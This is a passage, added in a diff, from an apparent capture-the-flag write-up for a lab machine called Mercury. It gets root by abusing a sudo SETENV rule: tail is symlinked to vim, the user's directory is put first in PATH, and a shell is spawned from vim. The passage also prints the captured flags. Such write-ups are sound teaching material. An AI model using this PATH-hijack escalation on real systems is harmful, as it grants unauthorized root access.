@@ -179,3 +179,92 @@ uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsy
 
 ## Shell as root
 
+Doing the basic enumeration, i always check `sudo -l` what we can run as root:
+
+```
+linuxmaster@mercury:~$ sudo -l
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+```
+
+We can run this file as root, interesting. We can notice the `SETENV` tag to be honest first time i see this after some google-fu i found that this tag allow users to preserve environment variables.
+
+Let's see the code of `check_syslog.sh` file.
+
+```bash
+#!/bin/bash
+tail -n 10 /var/log/syslog
+```
+
+Runs the `tail` command on `syslog` file. We can do a trick here and make symlink on tail to point on vim.
+
+```
+linuxmaster@mercury:~$ ln -s /usr/bin/vim tail
+linuxmaster@mercury:~$ ls -la tail
+lrwxrwxrwx 1 linuxmaster linuxmaster 12 Sep 13 19:04 tail -> /usr/bin/vim
+```
+
+Perfect, now let's change the PATH.
+
+```
+linuxmaster@mercury:~$ export PATH=$(pwd):$PATH
+linuxmaster@mercury:~$ echo $PATH
+/home/linuxmaster:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+
+We can use now the `--preserve-env` to set our environment variables.
+
+```
+linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+```
+
+This will load vim and we can run `:!bash` and we have root shell! :boom:
+
+```
+root@mercury:/home/linuxmaster# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Let's read the flags now.
+
+```
+root@mercury:~# cat /home/webmaster/user_flag.txt 
+[user_flag_8339915c9a454657bd60ee58776f4ccd]
+
+root@mercury:~# cat root_flag.txt 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+Congratulations on completing Mercury!!!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_69426d9fda579afbffd9c2d47ca31d90]
+```
+
+I enjoyed this box very much & i learnt some new things. See you! :simple_smile:
+
+
+
